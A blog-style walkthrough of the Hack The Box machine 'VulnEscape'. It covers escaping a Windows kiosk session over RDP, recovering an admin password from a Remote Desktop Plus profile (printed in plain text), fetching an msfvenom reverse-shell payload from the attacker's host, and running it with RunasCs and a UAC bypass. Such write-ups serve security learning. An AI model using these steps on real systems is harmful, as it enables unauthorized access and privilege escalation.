---
layout: posts
title: "HTB — VulnEscape Writeup"
date: 2026-02-20
tags: [htb, writeup, windows, web]
categories: [ctf]
---

## Overview

- **Machine:** VulnEscape
- **Platform:** Hack The Box
- **OS:** Windows
- **Difficulty:** Easy

VulnEscape is an easy and fun machine focused entirely on Remote Desktop. There are no web services involved and both the initial foothold and privilege escalation require you to work within the desktop environment and think around its restrictions.
It’s a unique and educational box that offers great insight into Windows application security and how small details can lead to bigger issues.

---

## Initial Enumeration

### Nmap Scan

```bash
Nmap scan report for 10.129.234.51
Host is up (0.031s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-19T17:03:43+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Escape
| Not valid before: 2026-02-18T16:59:34
|_Not valid after:  2026-08-20T16:59:34
| rdp-ntlm-info: 
|   Target_Name: ESCAPE
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   DNS_Domain_Name: Escape
|   DNS_Computer_Name: Escape
|   Product_Version: 10.0.19041
|_  System_Time: 2026-02-19T17:03:38+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Nmap shows us only one port open, which would be port 3389, also known as Remote Desktop Protocol for Windows. At first, I had my doubts and ran another TCP scan as well as a UDP scan. I got the same result and UDP didn't show anything open.

This leaves us with very limited options on the initial foothold of the box. I searched for known CVE's regarding this version, but got nothing. Next step would be brute forcing or trying to access without credentials.

I tried the easiest options first.

### Session as KioskUser

```bash
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ xfreerdp3 /v:10.129.234.51  
[11:45:18:118] [69011:00010d9c] [INFO][com.freerdp.client.x11] - [xf_pre_connect]: No user name set. - Using login name: kali
[11:45:18:121] [69011:00010d9c] [WARN][com.freerdp.client.xfreerdp.utils] - [run_action_script]: [ActionScript] no such script '/home/kali/.config/freerdp/action.sh'
[11:45:18:121] [69011:00010d9c] [WARN][com.freerdp.client.xfreerdp.utils] - [run_action_script]: [ActionScript] no such script '/home/kali/.config/freerdp/action.sh'
[11:45:18:604] [69011:00010d9c] [WARN][com.freerdp.crypto] - [verify_cb]: Certificate verification failure 'self-signed certificate (18)' at stack position 0
[11:45:18:604] [69011:00010d9c] [WARN][com.freerdp.crypto] - [verify_cb]: CN = Escape
[11:45:18:605] [69011:00010d9c] [ERROR][com.freerdp.crypto] - [tls_print_certificate_error]: New host key for 10.129.234.51:3389
[11:45:18:605] [69011:00010d9c] [ERROR][com.freerdp.crypto] - [tls_print_certificate_error]: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:45:18:605] [69011:00010d9c] [ERROR][com.freerdp.crypto] - [tls_print_certificate_error]: @    WARNING: NEW HOST IDENTIFICATION!     @
[11:45:18:605] [69011:00010d9c] [ERROR][com.freerdp.crypto] - [tls_print_certificate_error]: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:45:18:605] [69011:00010d9c] [ERROR][com.freerdp.crypto] - [tls_print_certificate_error]: The fingerprint for the host key sent by the remote host is 4c:b7:a1:05:ff:14:da:80:ec:33:2b:ac:1d:11:33:50:de:ca:75:73:93:80:a7:ef:28:d6:40:07:30:6b:33:4e
[11:45:18:605] [69011:00010d9c] [ERROR][com.freerdp.crypto] - [tls_print_certificate_error]: Please contact your system administrator.
[11:45:18:605] [69011:00010d9c] [ERROR][com.freerdp.crypto] - [tls_print_certificate_error]: Add correct host key in /home/kali/.config/freerdp/server/10.129.234.51_3389.pem to get rid of this message.
!!!Certificate for 10.129.234.51:3389 (RDP-Server) has changed!!!

New Certificate details:
        Common Name: Escape
        Subject:     CN = Escape
        Issuer:      CN = Escape
        Valid from:  Feb 19 12:01:13 2026 GMT
        Valid to:    Aug 21 12:01:13 2026 GMT
        Thumbprint:  4c:b7:a1:05:ff:14:da:80:ec:33:2b:ac:1d:11:33:50:de:ca:75:73:93:80:a7:ef:28:d6:40:07:30:6b:33:4e

Old Certificate details:
        Subject:     CN = Escape
        Issuer:      CN = Escape
        Valid from:  Feb 18 16:59:34 2026 GMT
        Valid to:    Aug 20 16:59:34 2026 GMT
        Thumbprint:  e2:83:44:76:ac:16:7e:48:c7:e6:24:41:78:e9:84:5d:0c:ab:03:68:39:67:ea:77:ee:b3:d2:2e:eb:6c:d9:04

The above X.509 certificate does not match the certificate used for previous connections.
This may indicate that the certificate has been tampered with.
Please contact the administrator of the RDP server and clarify.
Do you trust the above certificate? (Y/T/N) y
Domain:          
Password:        
[11:45:22:249] [69011:00010d9c] [INFO][com.freerdp.core.nla] - [nla_client_setup_identity]: No credentials provided - using NULL identity
[11:45:22:254] [69011:00010d9c] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5glue_get_init_creds (Cannot find KDC for realm "LOCALDOMAIN" [-1765328230])
[11:45:22:255] [69011:00010d9c] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5glue_get_init_creds (Cannot find KDC for realm "LOCALDOMAIN" [-1765328230])
[11:45:22:353] [69011:00010d9c] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_LOGON_FAILURE [0x00020014]
[11:45:22:353] [69011:00010d9c] [ERROR][com.freerdp.core.rdp] - [rdp_recv_callback_int][0x55c7632601a0]: CONNECTION_STATE_NLA - nla_recv_pdu() fail
[11:45:22:353] [69011:00010d9c] [ERROR][com.freerdp.core.rdp] - [rdp_recv_callback_int][0x55c7632601a0]: CONNECTION_STATE_NLA status STATE_RUN_FAILED [-1]
[11:45:22:353] [69011:00010d9c] [ERROR][com.freerdp.core.transport] - [transport_check_fds]: transport_check_fds: transport->ReceiveCallback() - STATE_RUN_FAILED [-1]
```

Using xfreerdp3 retrieves an error, which we will talk about later. Before trying to debug, I decided to give a chance to another alternative, `rdesktop`. This one works properly.

```bash
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ rdesktop 10.129.234.51       
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=Escape


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=Escape
     Issuer: CN=Escape
 Valid From: Thu Feb 19 07:01:13 2026
         To: Fri Aug 21 08:01:13 2026

  Certificate fingerprints:

       sha1: da210afab4d1b16a7ae57207436c6f88615658d7
     sha256: 4cb7a105ff14da80ec332bac1d113350deca75739380a7ef28d64007306b334e


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
```

It seems that we have a username by default.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura1.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura1.png" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/VulnEscape/Captura4.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura4.png" width="700">
  </a>
</p>

Using this username without password lets us in.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura2.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura2.png" width="700">
  </a>
</p>

When trying to click on anything, nothing happens. This tells us this is a heavily restricted session. The name of the box gives us a hint about what to do next.

If you’ve used Windows for a while, you know that most features are accessible through keyboard shortcuts. Even if the mouse is restricted, the keyboard often still works. For example, pressing the Windows key (if your keyboard has one) opens the Start Menu.

In restricted desktop environments, shortcuts can become your best friend.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura3.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura3.png" width="700">
  </a>
</p>

### Changing language

Here we can look into Settings and the Control Panel. This session seems to be in Korean, which I don't know anyhting about. My first objective will be to change the language, this will make everything more dynamic.

Using the "Windows key", I'll search for Settings and the Language.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura5.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura5.png" width="700">
  </a>
</p>

I'll click in the first option and change this option.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura6.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura6.png" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/VulnEscape/Captura7.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura7.png" width="700">
  </a>
</p>

I have no idea what the red text says, so I'll use ChatGPT to assist me there.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura8.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura8.png" width="700">
  </a>
</p>

Perfect, now we just have to log out and in again. Once again, we will be using the shortcut for this. With the `windows key + x`, we can open the "Quick Link Menu"

<p align="center">
  <a href="/assets/images/VulnEscape/Captura9.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura9.png" width="700">
  </a>
</p>

I was following along using my own Windows machine, so the menu layout looks like this on my system.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura10.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura10.png" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/VulnEscape/Captura11.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura11.png" width="700">
  </a>
</p>

They obviusoly are different, but it helped me out to understand where was I a little bit better. For the last part, I just asked ChatGPT once again.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura12.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura12.png" width="700">
  </a>
</p>

Alright, so the one we want is the second option. After that, the session will close and we'll have to open it again. With the new session, we now have the computer in english.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura13.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura13.png" width="700">
  </a>
</p>

### File read

Researching on how to escape from a restricted environment in RDP, I found this reddit [post](https://www.reddit.com/r/Pentesting/comments/1f7ekg6/restricted_desktop_environment_hacking_practice/) which results in a familiar name.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura14.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura14.png" width="700">
  </a>
</p>

Seeing this, I decided to investigate for `Kiosk Mode`

> *Windows Kiosk Mode (Assigned Access) is a security feature in Windows 10/11 that locks a device down to run only a single, specific app or a limited set of applications*

I also found [this](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/escape-breakout/) repository, which will make my life way easier.

Seeing the definition of Kiosk Mode, we'll have to see what applications we can use. My first attempt will be Microsoft Edge.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura15.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura15.png" width="700">
  </a>
</p>

It looks like we can use Edge. I'll try the hyperlink bypass featured in the github repository.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura16.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura16.png" width="700">
  </a>
</p>

We can read files properly, and this is our user.txt

<p align="center">
  <a href="/assets/images/VulnEscape/Captura17.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura17.png" width="700">
  </a>
</p>

### Getting command execution

Now I have to figure out how to get a command shell. I'll search for cmd.exe

<p align="center">
  <a href="/assets/images/VulnEscape/Captura18.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura18.png" width="700">
  </a>
</p>

It downloaded but we can't execute it, we don't have permissions for it.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura19.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura19.png" width="700">
  </a>
</p>

If we investigate a little bit about the Kiosk User, it can be set up as `"Assigned Access (Single-App Mode)"` or `"Multi-App"`.

> *Assigned Access (Single-App Mode): This is the most restrictive method, ideal for public-facing devices. It runs a single Universal Windows Platform (UWP) app or Microsoft Edge in full-screen, rendering the Windows shell, taskbar, and desktop completely inaccessible.*

> *Multi-App Kiosk Mode: This mode allows administrators to define a whitelist of specific applications, such as a browser, a specific document viewer, and a calculator, while blocking all others.*

Because we can access the system settings and the control panel, as well as Microsoft Edge, it's safe to assume this is a Multi-App mode. Reading it's definition tells us that it works based on a whitelist of permitted applications.

Knowing this, I'll be bypassing a whitelist. My first attempt will be to rename de executable to something that is inside the whitelist, for example `msedge.exe`, the executable of Micrososft Edge.

We'll right click and choose `"Save link as"` on our previously downloaded cmd.exe.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura20.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura20.png" width="700">
  </a>
</p>

Rename it to msedge.exe.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura21.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura21.png" width="700">
  </a>
</p>

After this, we can see that our new download is now named msedge.exe, and it succesfully opens cmd.exe

<p align="center">
  <a href="/assets/images/VulnEscape/Captura23.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura23.png" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/VulnEscape/Captura22.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura22.png" width="700">
  </a>
</p>

### Shell as admin

We have achieved command execution now, we can do basic recon with what we have. I'll spawn powershell.

whoami /all doesn't reveal anything interesting

```powershell
PS C:\Users\kioskUser0> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
escape\kioskuser0 S-1-5-21-3698417267-3345840482-3422164602-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\로컬 계정             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

I remember when achieving file read before, I saw a suspicious folder in `C:/` named `_admin`. It's hidden so we'll have to use gci -hidden to uncover it.

```bash
PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/3/2024   3:11 AM                inetpub
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---         4/10/2025  11:29 PM                Program Files
d-r---          2/3/2024   3:03 AM                Program Files (x86)
d-r---          2/3/2024   3:43 AM                Users
d-----         6/24/2025   1:24 PM                Windows


PS C:\> gci -hidden


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs-          2/4/2024  12:52 AM                $Recycle.Bin
d--h--         6/24/2025   8:23 AM                $WinREAgent
d--hsl          2/3/2024  11:32 AM                Documents and Settings
d--h--         6/24/2025   8:06 AM                ProgramData
d--hs-         10/1/2024  11:40 PM                Recovery
d--hs-         6/16/2025   4:42 AM                System Volume Information
d--h--          2/3/2024   3:05 AM                _admin
-a-hs-          2/4/2024   1:35 AM           8192 DumpStack.log
-a-hs-         2/21/2026   5:57 AM           8192 DumpStack.log.tmp
-a-hs-         10/1/2024  11:48 PM     2093002752 hiberfil.sys
-a-hs-         2/21/2026   5:57 AM     1476395008 pagefile.sys
-a-hs-         2/21/2026   5:57 AM       16777216 swapfile.sys
```

Inside, we only have one interesting file as the other folders and files are empty.

```powershell
PS C:\> cd _admin
PS C:\_admin> ls


    Directory: C:\_admin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/3/2024   3:04 AM                installers
d-----          2/3/2024   3:05 AM                passwords
d-----          2/3/2024   3:05 AM                temp
-a----          2/3/2024   3:03 AM              0 Default.rdp
-a----          2/3/2024   3:04 AM            574 profiles.xml


PS C:\_admin> cat profiles.xml
<?xml version="1.0" encoding="utf-16"?>
<!-- Remote Desktop Plus -->
<Data>
  <Profile>
    <ProfileName>admin</ProfileName>
    <UserName>127.0.0.1</UserName>
    <Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>
    <Secure>False</Secure>
  </Profile>
</Data>
PS C:\_admin> ls
```

### Profiles.xml

The .xml is a configuration file for a session for the user `admin` in the application `Remote Desktop Plus`. The password field seems base64 encoded.

```bash
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ echo 'JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=' | base64 -d         
%j���}
      W^h� ��ƴ��d��O��v�g
```

Decoding it shows me it's not plaintext, I'll use xxd and get the length to see if it's a hash.

```bash
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ echo 'JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=' | base64 -d | xxd   
00000000: 256a a497 a203 7d0c 575e 6887 20a2 0ff1  %j....}.W^h. ...
00000010: c6b4 1bd5 f19d 6419 82fb 4f80 e376 bd67  ......d...O..v.g
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ echo 'JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=' | base64 -d | wc -c
32
```

Seeing the outputs makes me strongly believe this a hash, high entropy and 32 characters. I'll convert it to hex and see what I can do with hashcat.

```bash
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ echo 'JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=' | base64 -d | xxd -p
256aa497a2037d0c575e688720a20ff1c6b41bd5f19d641982fb4f80e376bd67
```

With hashid, we can see we've got some candidates.

```bash
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ echo '256aa497a2037d0c575e688720a20ff1c6b41bd5f19d641982fb4f80e376bd67' | hashid
Analyzing '256aa497a2037d0c575e688720a20ff1c6b41bd5f19d641982fb4f80e376bd67'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256)
```

The most common here would be SHA-256, so I'll try that.

```powershell
Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 256aa497a2037d0c575e688720a20ff1c6b41bd5f19d641982f...76bd67
Time.Started.....: Sat Feb 21 15:24:49 2026, (2 secs)
Time.Estimated...: Sat Feb 21 15:24:51 2026, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  8077.6 kH/s (1.73ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Speed.#2.........:  1908.0 kH/s (10.11ms) @ Accel:128 Loops:1 Thr:64 Vec:1
Speed.#*.........:  9985.6 kH/s
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14196588/14344384 (98.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 0302146 -> 015601
Candidates.#2....: $HEX[30313536303034] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 52c Util: 13% Core:1394MHz Mem:6114MHz Bus:16
Hardware.Mon.#2..: N/A

Started: Sat Feb 21 15:24:46 2026
Stopped: Sat Feb 21 15:24:53 2026
PS Z:\folder\hashcat>
```

It didn't crack, so I tought about using the config file directly in the application it's meant for. I'll look for `Remote Desktop Plus`.

Because the machine is small, it was easy to find. Usually applications sit in either `"Program Files"` or `"Program Files (x86)"`

```powershell
PS C:\Program Files (x86)> ls


    Directory: C:\Program Files (x86)


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:31 AM                Common Files
d-----         6/24/2025   1:19 PM                Internet Explorer
d-----          2/3/2024   3:14 AM                Microsoft
d-----         12/7/2019   1:31 AM                Microsoft.NET
d-----          2/3/2024   3:03 AM                Remote Desktop Plus
d-----         6/24/2025  10:10 AM                Windows Defender
d-----          2/3/2024   3:07 AM                Windows Mail
d-----         6/24/2025  10:10 AM                Windows Media Player
d-----         6/24/2025   1:19 PM                Windows Multimedia Platform
d-----         12/7/2019   1:50 AM                Windows NT
d-----         6/24/2025  10:10 AM                Windows Photo Viewer
d-----         6/24/2025   1:19 PM                Windows Portable Devices
d-----         12/7/2019   1:31 AM                WindowsPowerShell
```

It's just and .exe, so we'll execute it directly.

```powershell
PS C:\Program Files (x86)> cd '.\Remote Desktop Plus\'
PS C:\Program Files (x86)\Remote Desktop Plus> ls


    Directory: C:\Program Files (x86)\Remote Desktop Plus


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/13/2018  10:47 PM         267264 rdp.exe

PS C:\Program Files (x86)\Remote Desktop Plus> .\rdp.exe
```

<p align="center">
  <a href="/assets/images/VulnEscape/Captura28.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura28.png" width="700">
  </a>
</p>

### Remote Desktop Plus

A very simple application, to import the xml we'll click on `Manage Profiles`.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura29.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura29.png" width="700">
  </a>
</p>

And then on `Import and Export`, I'll select Import Profiles.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura30.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura30.png" width="700">
  </a>
</p>

Unfortunately, we only have access to Downloads with a file explorer.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura31.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura31.png" width="700">
  </a>
</p>

I'll apply the same trick I used for cmd.exe, and download profiles.xml through Microsoft Edge.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura32.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura32.png" width="700">
  </a>
</p>

Now that it is in Downloads, we can import it.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura33.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura33.png" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/VulnEscape/Captura34.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura34.png" width="700">
  </a>
</p>

Sadly, the password is hidden and I can't copy paste it and trying to use the given session to connect will output an error.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura35.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura35.png" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/VulnEscape/Captura36.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura36.png" width="700">
  </a>
</p>

### BulletPassView

Searching around for alternatives, I found the utility [`BulletPassView`](https://www.nirsoft.net/utils/bullets_password_view.html) from NirSoft. It's a very simple application that uncovers passwords hidden with bullets in applications in Windows.

To get the utility, simply download the .zip given in the page for x64 version. We'll transfer it from our kali.

```powershell
PS C:\Users\kioskUser0> iwr -uri http://10.10.14.16/BulletsPassView.exe -o BulletsPassView.exe
PS C:\Users\kioskUser0> ls


    Directory: C:\Users\kioskUser0


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          2/3/2024   3:10 AM                3D Objects
d-r---          2/3/2024   3:10 AM                Contacts
d-r---         6/24/2025   7:31 AM                Desktop
d-r---         2/21/2026   6:34 AM                Documents
d-r---         2/21/2026   6:36 AM                Downloads
d-r---          2/3/2024   3:10 AM                Favorites
d-r---          2/3/2024   3:10 AM                Links
d-r---          2/3/2024   3:10 AM                Music
d-r---          2/3/2024   3:10 AM                Pictures
d-r---          2/3/2024   3:10 AM                Saved Games
d-r---          2/3/2024   3:10 AM                Searches
d-r---          2/3/2024   3:10 AM                Videos
-a----         2/21/2026   6:56 AM          98400 BulletsPassView.exe

PS C:\Users\kioskUser0> .\BulletsPassView.exe
```

Upon execution, and tinkering a little bit with Remote Desktop Plus, we have our password.

<p align="center">
  <a href="/assets/images/VulnEscape/Captura37.png" class="glightbox">
    <img src="/assets/images/VulnEscape/Captura37.png" width="700">
  </a>
</p>

We can simply use the newly obtained credentials with [Runas](https://github.com/antonioCoco/RunasCs).

I'll place a shell in C:\Users\Public generated with msfvenom to easily get a reverse shell.

```powershell
PS C:\Users\Public> iwr -uri http://10.10.14.16/shell.exe -o shell.exe
PS C:\Users\Public> ls


    Directory: C:\Users\Public


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          2/3/2024  11:32 AM                Documents
d-r---         12/7/2019   1:14 AM                Downloads
d-r---         12/7/2019   1:14 AM                Music
d-r---         12/7/2019   1:14 AM                Pictures
d-r---         12/7/2019   1:14 AM                Videos
-a----         2/21/2026   7:04 AM           7168 shell.exe
```

We receive a shell in our listener.

```powershell
PS C:\Users\kioskUser0> .\RunasCs.exe admin Twisting3021 C:\Users\Public\shell.exe
```

```bash
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ nc -lvnp 9001           
listening on [any] 9001 ...
connect to [10.10.14.16] from (UNKNOWN) [10.129.234.51] 50205
Microsoft Windows [Version 10.0.19045.5965]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
escape\admin
```

However, when trying to access the flag, we don't have permissions for it. This is because of the [UAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/)

```powershell
PS C:\Users\Administrator> ls
ls
ls : Access to the path 'C:\Users\Administrator' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

```powershell
PS C:\Users\kioskUser0> .\RunasCs.exe admin Twisting3021 C:\Users\Public\shell.exe
[*] Warning: The logon for user 'admin' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
```

Actually, Runas is warning us about this, and it's just about adding a couple of flags to obtain our missed privileges.

```powershell
PS C:\Users\kioskUser0> .\RunasCs.exe admin Twisting3021 C:\Users\Public\shell.exe --bypass-uac --logon-type '8'
```

And now our newly acquired shell works with all the privileges.

```bash
┌──(kali㉿kali)-[~/hackthebox/vulnescape]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.16] from (UNKNOWN) [10.129.234.51] 50206
Microsoft Windows [Version 10.0.19045.5965]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
escape\admin

C:\Windows\system32>cd /Users
cd /Users

C:\Users>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users> ls
    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          2/3/2024   2:39 AM                admin                                                                
d-----         6/25/2025   2:45 AM                Administrator                                                        
d-----          2/3/2024   3:12 AM                DefaultAppPool                                                       
d-----         2/21/2026   7:02 AM                kioskUser0                                                           
d-r---         2/21/2026   7:06 AM                Public                                                               


PS C:\Users> cd Administrator
PS C:\Users\Administrator> ls

    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---          2/3/2024   3:43 AM                3D Objects                                                           
d-r---          2/3/2024   3:43 AM                Contacts                                                             
d-r---          2/3/2024   3:44 AM                Desktop                                                              
d-r---          2/3/2024   3:43 AM                Documents                                                            
d-r---         6/25/2025   2:40 AM                Downloads                                                            
d-r---          2/3/2024   3:43 AM                Favorites                                                            
d-r---          2/3/2024   3:43 AM                Links                                                                
d-r---          2/3/2024   3:43 AM                Music                                                                
d-r---          2/3/2024   3:44 AM                OneDrive                                                             
d-r---          2/3/2024   3:44 AM                Pictures                                                             
d-r---          2/3/2024   3:43 AM                Saved Games                                                          
d-r---          2/3/2024   3:44 AM                Searches                                                             
d-r---          2/3/2024   3:43 AM                Videos                                                               

PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          2/3/2024   9:07 AM           2332 Microsoft Edge.lnk                                                   
-ar---         2/21/2026   5:58 AM             34 root.txt                                                             

```

